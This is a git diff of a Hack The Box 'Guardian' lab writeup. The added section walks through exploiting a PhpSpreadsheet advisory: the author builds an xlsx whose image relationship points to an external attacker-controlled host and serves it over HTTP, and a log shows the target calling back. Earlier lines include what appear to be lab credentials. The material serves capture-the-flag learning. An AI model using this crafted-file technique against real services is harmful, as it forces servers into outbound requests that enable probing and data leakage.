@@ -1,4 +1,4 @@
-# guardian htb
+# Guardian HTB Writeup
 
 ### https://app.hackthebox.com/machines/Guardian
 
@@ -63,6 +63,8 @@ GU0142023:GU0142023
 GU0142023
 
 <img width="1651" height="394" alt="image" src="https://github.com/user-attachments/assets/54aa450b-4b34-4e43-ad97-fa84b8e15e71" />
+
+<img width="1862" height="925" alt="image" src="https://github.com/user-attachments/assets/7aad6c49-5692-43d7-bbf3-6f736ccb2c0b" />
 
 ```html
 <option value="1">admin</option>
@@ -132,5 +134,47 @@ GU0142023
 
 <img width="1843" height="916" alt="image" src="https://github.com/user-attachments/assets/3ad67c7d-0389-40b9-aae2-0f45e77d34fa" />
 
+<img width="581" height="190" alt="image" src="https://github.com/user-attachments/assets/0a73b1a8-67aa-46ac-9c6e-d4bd539f86a5" />
 
+https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-rx7m-68vc-ppxh
 
+create an `xslx` file with some image
+
+```
+Hexada@hexada ~/Downloads$ unzip test.xlsx' -d xlsx-payload
+```
+
+```xml
+
+Hexada@hexada ~/Downloads/xlsx-payload/xl/drawings$ cat drawing1.xml                                                                                              
+<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart" xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" xmlns:cx1="http://schemas.microsoft.com/office/drawing/2015/9/8/chartex" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:dgm="http://schemas.openxmlformats.org/drawingml/2006/diagram" xmlns:x3Unk="http://schemas.microsoft.com/office/drawing/2010/slicer" xmlns:sle15="http://schemas.microsoft.com/office/drawing/2012/slicer"><xdr:oneCellAnchor><xdr:from><xdr:col>0</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>0</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from><xdr:ext cx="6886575" cy="4314825"/><xdr:pic><xdr:nvPicPr><xdr:cNvPr id="0" name="image1.png" title="Зображення"/><xdr:cNvPicPr preferRelativeResize="0"/></xdr:nvPicPr><xdr:blipFill><a:blip cstate="print" r:link="rId1"/><a:stretch><a:fillRect/></a:stretch></xdr:blipFill><xdr:spPr><a:prstGeom prst="rect"><a:avLst/></a:prstGeom><a:noFill/></xdr:spPr></xdr:pic><xdr:clientData fLocksWithSheet="0"/></xdr:oneCellAnchor></xdr:wsDr>
+```
+
+```xml
+Hexada@hexada ~/Downloads/xlsx-payload/xl/drawings/_rels$ cat drawing1.xml.rels                                                                                   
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1"
+    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
+    TargetMode="External"
+    Target="http://10.10.16.33:1717/pixel.png"/>
+</Relationships>
+```
+
+```
+Hexada@hexada ~/Downloads/xlsx-payload$ zip -r ../exploit.xlsx *
+```
+
+```
+(lab-env) Hexada@hexada ~/Downloads$ python3 -m http.server 1717 --bind 10.10.16.33                                                                               
+Serving HTTP on 10.10.16.33 port 1717 (http://10.10.16.33:1717/) ...
+```
+
+<img width="997" height="425" alt="image" src="https://github.com/user-attachments/assets/b633d22d-89c5-4af8-85c8-ddd745d4ea4d" />
+
+```
+(lab-env) Hexada@hexada ~/Downloads$ python3 -m http.server 1717 --bind 10.10.16.33                                                                               
+Serving HTTP on 10.10.16.33 port 1717 (http://10.10.16.33:1717/) ...
+10.10.11.84 - - [31/Aug/2025 17:41:12] code 404, message File not found
+10.10.11.84 - - [31/Aug/2025 17:41:12] "GET /pixel.png HTTP/1.1" 404 -
+```
